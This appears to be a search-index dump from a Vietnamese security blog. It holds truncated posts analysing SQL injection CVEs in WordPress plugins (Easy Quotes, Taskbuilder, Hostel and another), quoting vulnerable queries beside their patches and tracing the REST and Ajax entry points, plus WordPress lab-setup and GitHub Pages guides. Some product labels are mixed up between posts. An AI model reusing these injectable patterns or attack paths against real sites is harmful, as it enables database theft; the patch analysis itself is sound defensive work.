quả cho thấy hàm này được gọi trong: retrieve_contacts_associated_with_learndash() perform_learndash_user_import() thuộc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php. Tiếp theo, để xác định nơi retrieve_contacts_associated_with_learndash() được sử dụng, ta tìm kiếm từ khóa retrieve_contacts_associated_with_learndash trong thư mục plugin. Search 1 Hàm này được gọi trong map_contacts_with_learndash() thuộc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php. Tiếp tục tìm kiếm từ khóa map_contacts_with_learndash để xem hàm này được đăng ký ở đâu: Search 2 Ta phát hiện rằng nó được dùng làm callback của REST API thông qua hàm register_rest_route() trong WordPress: class ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u003enamespace, // mrm/v1 $this-\u003erest_base . '/learndash/map', // contacts/import/learndash/map/ array( array( 'methods' =\u003e WP_REST_Server::CREATABLE, // POST 'callback' =\u003e array( $this-\u003econtroller, 'map_contacts_with_learndash' ), 'permission_callback' =\u003e PermissionManager::current_user_can('mint_manage_contacts'), // Admin 'args' =\u003e array( 'selectedCourses' =\u003e array( 'description' =\u003e __( 'The selected courses from which to import contacts.', 'mrm' ), 'required' =\u003e true, 'type' =\u003e 'array', 'sanitize_callback' =\u003e 'rest_sanitize_array","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Easy Quotes Plugin.","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng xảy ra trên plugin Easy Quotes của WordPress trước phiên bản 1.2.3. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v1.2.2(vul) và v1.2.3(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà không sử dụng các biện pháp bảo vệ khiến lỗ hổng SQL Injection xảy ra. Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/quotes-data.php private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } Bản vá sử dụng $wpdb-\u003eprepare() thay vì truyền trực tiếp dữ liệu từ người dùng vào câu query. private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; $sql = $wpdb-\u003eprepare( \"SELECT * FROM %i WHERE `family` = %s\", $tablename, $family ); return $wpdb-\u003eget_row($sql); } Patch diff Có nhiều hàm cũng được vá bằng cách trên, như: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1) Tuy get_fonts_categories() đã được vá nhưng nó không chứa dữ liệu từ người dùng, nên không cần quan tâm public static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-categories'; $sql = $wpdb-\u003eprepare( \"SELECT `category_id`, `category` FROM %i\", $tablename ); return $wpdb-\u003eget_results($sql); } How it work? Ta khai thác lỗi SQL Injection trong hàm get_family_data($family), các hàm còn lại khai thác tương tự. get_family_data() là hàm public trong class Quotes_Data class Quotes_Data { function __construct() { add_filter('posts_where', array($this, 'posts_where'), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } } get_family_data() được gọi trong 2 hàm get_family() và get_font_variants() của class Quotes_Data, để biết chúng sử dụng ở đâu, ta tìm kiến với từ khóa get_family hoặc get_font_variants Search function Hàm get_font_variants() được gọi trong hàm rest_route_callback_font_variants() của class Quotes_Rest_Route class Quotes_Rest_Route { function __construct() { add_action('rest_api_init', array($this, 'rest_api_init')); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ 'method' =\u003e WP_REST_Server::READABLE, 'callback' =\u003e [$this, 'rest_route_callback_quote'], 'permission_callback' =\u003e '__return_true' ]; register_rest_route('layart/v1', '/quote', $args); // other logic $args['callback'] = [$this, 'rest_route_callback_font_variants']; register_rest_route('layart/v1', '/font-variants', $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u003eget_param('family'); $family = isset($family) ? $family : \"Shadows Into Light\"; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } Hàm khởi tạo của class Quotes_Rest_Route sử dụng add_action(hook_name, callback) với hook_name là rest_","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Taskbuilder Plugin.","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng xảy ra trên plugin Taskbuilder của WordPress trước phiên bản 4.0.2. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v4.0.1(vul) và v4.0.2(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng đã xử lý dữ liệu đầu vào trước khi đưa vào câu SQL. Tuy nhiên, trong quá trình xây dựng truy vấn, giá trị này được chèn trực tiếp mà không được bao trong dấu nháy đơn '...'. Điều đó khiến kẻ tấn công có thể chèn thêm các thành phần cú pháp SQL hợp lệ (như OR, AND,...) vào truy vấn, dẫn đến lỗ hổng SQL Injection. Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/admin/projects/get_users.php Trong phiên bản v4.0.1, biến $proj_id sau khi escape được đưa thẳng vào câu truy vấn mà không có dấu nháy đơn bao quanh: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = $proj_id\" ); Ở bản v4.0.2, truy vấn đã được điều chỉnh bằng cách đặt $proj_id trong dấu nháy đơn sau khi escape: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = '$proj_id'\" ); Bản vá này đảm bảo rằng giá trị $proj_id sau khi escape được coi là một chuỗi literal, không thể thoát ra khỏi dấu nháy đơn để chèn thêm cú pháp SQL, qua đó ngăn chặn tấn công SQL Injection. Patch diff How it work? File architecture: Cấu trúc chung của file hiện tại $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row(\"SELECT * FROM {$wpdb-\u003eprefix}wppm_project WHERE id = $proj_id\"); // Bắt đầu buffer để tạo nội dung chính (body) của modal ob_start(); // ... render HTML danh sách users $body = ob_get_clean(); // Bắt đầu buffer để tạo phần footer của modal ob_start(); // ... render HTML các nút thao tác (Close, Save) $footer = ob_get_clean(); // Trả dữ liệu JSON để frontend hiển thị modal echo json_encode([ 'body' =\u003e $body, 'footer' =\u003e $footer, ]); $proj_id / $project: Lấy dữ liệu project từ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vì xuất trực tiếp, giúp gom nội dung vào biến. $body / $footer: Chứa nội dung HTML động của modal. json_encode(): Trả JSON cho client, có khả năng được sử dụng trong Ajax để hiển thị modal mà không cần refresh trang. File nằm trong thư mục includes cho thấy rằng nó sẽ được gọi ở 1 chức năng nào đó ở nơi khác. Để biết chức năng nào sử dụng nó, ta tìm kiếm với từ khóa get_users.php trong thư mục chứa plugin. Search users 👉 Nó được include trong hàm wppm_get_users() của class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() là callback của action hook trong WordPress. WPPM_Admin construct: final class WPPM_Admin { // constructor public function __construct() { // other action add_action( 'wp_ajax_wppm_get_users',array($this,'wppm_get_users')); // array($this,'wppm_get_users')) = $this::wppm_get_users() // other action } } add_action() là một Plugin API của WordPress, cho phép gắn một callback vào một action hook. wp_ajax_wppm_get_users là tên hook Ajax, với quy tắc đặt tên: wp_ajax_{action} =\u003e Xử lý Ajax khi user đã đăng nhập. wp_ajax_nopriv_{action} =\u003e Xử lý Ajax khi user chưa đăng nhập. Ở đây, action = wppm_get_users. Nghĩa là nếu trong Ajax request bạn gửi action=wppm_get_users tới admin-ajax.php, thì WordPress sẽ tìm callback tương ứng để xử lý, ở đây là wppm_get_users(). 👉 Ta đã biết được action = wppm_get_users, kiểm tra xem Ajax nào sử dụng action này bằng cách tìm từ khóa wppm_get_users trên các file .js trong thư mục chứa plugin. Ajax search Action wppm_get_users là phần data trong request POST của hàm wppm_get_users() Hàm wppm_get_users() sẽ đ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng trong plugin Hostel trước phiên bản 1.1.5.7. Do dữ liệu đầu vào không được xử lý đúng cách, điều này có thể cho phép kẻ tấn công tương tác trực tiếp với cơ sở dữ liệu, bao gồm nhưng không giới hạn ở việc đánh cắp dữ liệu. CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, dùng để quản lý đặt phòng trên WordPress, chứa lỗi SQL Injection tại tham số ob trong phần Manage Bookings. Background Hostel Plugin cho phép tạo trang web nhà trọ, khách sạn nhỏ hoặc BnB bằng WordPress. Nó cung cấp: Form đặt phòng Lịch phòng Quản lý bookings Exploitation Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.6(vul) và v1.1.5.7(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version Code Comparison Sử dụng diff tool so sánh sự khác biệt giữa 2 version if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } if(!empty($_GET['ob'])) { $ob = sanitize_text_field($_GET['ob']); if(!in_array($ob, ['tB.id', 'tB.contact_name', 'tB.contact_email', 'tB.from_date', 'tB.amount_paid', 'tB.status'])) { $ob = 'tB.id'; } $orderby = \"ORDER BY $ob $dir\"; } 👉 Bản vá sử dụng whitelist để giới hạn các cột có thể được sắp xếp, nếu không hợp lệ trả về 'tB.id'. Analysis: Lỗ hổng xuất hiện khi param ob được truyền trực tiếp vào mệnh đề ORDER BY thông qua hàm sanitize_text_field(), chỉ escape mà không filter SQLi. Detect SQLi Để inject được, ta cần phải xác định toàn bộ câu query được được sử dụng ở đây $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); Cấu query nằm trong nhánh default của cấu trúc switch. Toàn bộ đoạn xử lý naỳ thuộc về hàm static manage() của class WPHostelBookings. class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { case 'add': // add handle break; case 'edit': // edit handle break; // view/print booking details. Will allow also to confirm/cancel case 'view': // view handle break; // list bookings default: // another logic if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); // another logic break; } } } Trong WordPress, plugin giao tiếp với core thông qua Plugin API (Hook System). Do đó, để xác định nơi hàm manage() được gọi, ta có thể tìm kiếm từ khóa \"manage\" trong thư mục chứa plugin. Search Trong file models/hostel.php ta có hàm: class class WPHostel { // another logic static function menu() { // we use 'hostelpro_manage' for consistency with the pro version $wphostel_caps = current_user_can('manage_options') ? 'manage_options' : 'hostelpro_manage'; add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __('Settings', 'wphostel'), __('Settings', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __(\"Manage Rooms\", 'wphostel'), __(\"Manage Rooms\", 'wphostel'), $wphostel_caps, 'wphostel_rooms', array('WPHostelRooms', \"manage\")); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); add_submenu_page('wphostel_options', __(\"Unavailable Dates\", 'wphostel'), __(\"Unavailable Dates\", 'wphostel'), $wphostel_caps, 'wphostel_unavailable', array('WPHostelBookings', \"unavailable\")); add_submenu_","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/"},{"categories":["Web"],"content":"A powerful and the most popular content management system (CMS).","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"content":"WordPress là một hệ thống quản lý nội dung (CMS) mạnh mẽ và phổ biến nhất cho phép bạn tạo, quản lý và tùy chỉnh các trang web và blog một cách dễ dàng. Nó là open-source CMS, được xây dựng trên PHP và sử dụng cơ sở dữ liệu MySQL hoặc Maria DB. Ra đời năm 2003, ban đầu chỉ để viết blog, sau đó phát triển thành nền tảng tạo website, cửa hàng online, diễn đàn, landing page… Hiện nay, hơn 40% website trên thế giới chạy bằng WordPress. Có 2 phiên bản WordPress: WordPress.com Dịch vụ hosting do Automattic cung cấp Bạn chỉ cần đăng ký tài khoản, không phải cài đặt Hạn chế tùy chỉnh, muốn nâng cao thì phải trả phí WordPress.org Mã nguồn mở, bạn tự tải về và cài đặt lên hosting/server riêng Tùy chỉnh toàn diện, có thể cài plugin, theme, viết code, tạo website theo ý mình Ecosystem Core: CMS chính Plugin: Một phần mềm bổ sung có thể được cài đặt trên trang web WordPress để mở rộng chức năng của nó và thêm các tính năng mới Themes: Một phần mềm bổ sung đại diện cho sự xuất hiện trực quan và bố cục của một trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024 Most Popular Hiện tại hơn 40% website trên toàn thế giới chạy WordPress Nghĩa là hacker chỉ cần tìm ra một lỗ hổng phổ biến =\u003e có thể khai thác hàng triệu site cùng lúc Giống như “cá nhiều thì chài ở đó” Plugin and Theme WordPress Core đã được xem xét trong 1 thời gian dài bởi hàng ngàn developers và researchers. Kết quả là rất khó để kẻ tấn công có thể đột nhập vào Tuy nhiên, có hàng chục ngàn plugin và theme từ nhiều nguồn, chất lượng không đồng đều được sử dụng Nhiều plugin code bảo mật kém, không còn được cập nhật. Hacker chỉ cần scan plugin/theme để tìm version lỗi thời, rồi khai thác Setup WordPress for Hacking Có rất nhiều cách để setup WorkPress, tìm kiếm bằng Google có thể cung cấp nhiều bài viết về nó. Ở đây tôi sẽ setup trên máy ảo Ubuntu (22.04): Không ảnh hưởng đến các dịch vụ của máy thật WordPress tương đối nhẹ để sử dụng trên máy ảo Install and configure WordPress Install Dependencies Cài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Tải và cài mã nguồn WordPress vào thư mục web. # Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro: Ubuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. {: .prompt-info } Configure Apache for WordPress Tạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress: # Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). \u003cVirtualHost *:80\u003e # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress \u003cDirectory /srv/www/wordpress\u003e Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted \u003c/Directory\u003e # Riêng thư mục wp-content (chứa plugin, ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:0:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"content":"How to create your personal blog using Github Pages with \"comment\" feature","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Khi bắt đầu tạo blog cá nhân, có ba công cụ bạn cần biết: GitHub Pages, Jekyll và Giscus. Github Pages: Dịch vụ miễn phí từ GitHub, cho phép bạn triển khai website tĩnh trực tiếp từ repository. Chỉ cần push code lên GitHub, blog của bạn sẽ tự động xuất hiện trên Internet mà không cần server riêng. Jekyll: Một static site generator tích hợp sẵn với GitHub Pages. Jekyll giúp bạn dễ dàng tạo blog từ các file Markdown, tổ chức nội dung bằng template và theme sẵn có. Giscus: Một hệ thống bình luận hiện đại dựa trên GitHub Discussions. Thay vì phải dùng dịch vụ ngoài như Disqus, bạn có thể tận dụng GitHub để quản lý comment, vừa gọn nhẹ vừa thân thiện với developer. Requirements Tài khoản Github Kiến thức cơ bản về Markdown Creating a Site Repository Ở đây, tôi sử dụng Chirpy themes, đây là theme khá nổi tiếng dành cho GitHub Pages, được tối ưu cho việc viết blog cá nhân hoặc technical blog. Các bước thực hiện: Đăng nhập vào Github và di chuyển đến starter Thay vì Fork, ta click Use this template và chọn Create a new repository để tự động tạo Site Repository. Đặt tên cho Repository mới \u003cusername\u003e.github.io, thay đổi \u003cusername\u003e thành Github username của bạn. Setting up the Environment Có 2 lý do chính bạn nên setup môi trường trên máy local khi phát triển blog: Sau khi push code lên Repository, GitHub Actions sẽ mất một khoảng thời gian để chạy rồi mới build và render ra GitHub Pages. Khi dev trực tiếp trên local, bạn có thể quan sát kết quả ngay lập tức, nhanh hơn và thuận tiện hơn. Using Dev Containers (Recommended for Windows) Dev Containers cung cấp một môi trường cô lập bằng Docker, giúp tránh xung đột với hệ thống và đảm bảo mọi dependency đều được quản lý trong container. Các bước thực hiện: Cài đặt Docker: Trên Windows/macOS: cài Docker Desktop. Trên Linux: cài Docker Engine. Cài VS Code và extension Dev Containers. Clone repository: Nếu dùng Docker Desktop: mở VS Code và clone repo trong container volume. Nếu dùng Docker Engine: clone repo về local, sau đó mở bằng container trong VS Code. Chờ quá trình thiết lập Dev Containers hoàn tất. Setting up Natively (Recommended for Unix-like OS) Với các hệ điều hành dạng Unix-like (Linux, macOS), bạn có thể setup môi trường trực tiếp (native) để đạt hiệu năng tốt nhất. Ngoài ra, vẫn có thể dùng Dev Containers như một lựa chọn thay thế. Các bước thực hiện: Làm theo hướng dẫn cài đặt Jekyll và đảm bảo đã cài đặt Git. Clone repository về máy local. Nếu bạn fork theme, cài Node.js và chạy bash tools/init.sh trong thư mục gốc để khởi tạo repo. Chạy lệnh dưới đây ở thư mục gốc để toàn bộ gem sẽ được cài vào ./vendor/bundle/ trong project, không cần sudo và không đụng gì đến /var/lib/gems.. bundle config set --local path 'vendor/bundle' bundle install Usage Start the Jekyll Server Để chạy site trên local, sử dụng lệnh dưới đây: bundle exec jekyll s Configuration Một số biến cần cấu hình trong _config.yml, bao gồm: lang: Set language cho website của bạn url: Trỏ đến website của bạn title: Title chính, nằm dưới avatar tagline: Subtitle, mô tả trang web avatar: hỗ trợ local và CORS resources, có thể sử dụng gif Comment feature via Giscus Ta sử dụng Giscus làm hệ thống comment cho website, ngoài ra còn các option khác như: Disqus, Utterances, tất cả đều miễn phí. Các bước thực hiện: Cài đặt giscus vào Github. Vào Settings của repository chọn General và bật Discussions để giscus lưu comments vào Discussions. Nhập repository \u003cusername\u003e/\u003cusername\u003e.github.io, thông báo màu xanh lá xuất hiện khi các tiêu chí ở trên được đáp ứng. Chọn thể loại discussion và chủ đề cho website. Cấu hình giscus trong _config.yml provider: chọn giscus giscus: mapping các biến tương ứng đã làm ở giscus vào biến giscus. Customize the Favicon Tạo favicon riêng cho website của bạn, không phải sử dụng favicon mặc định của themes Các bước thực hiện: Truy cập Favicon Genarate Click Browse chọn favicon cần tạo, sau đó click Create Favicon để tạo. Click Download the generated favicon để tải các file chứa các favicon về. Giải nén","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:0:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"}]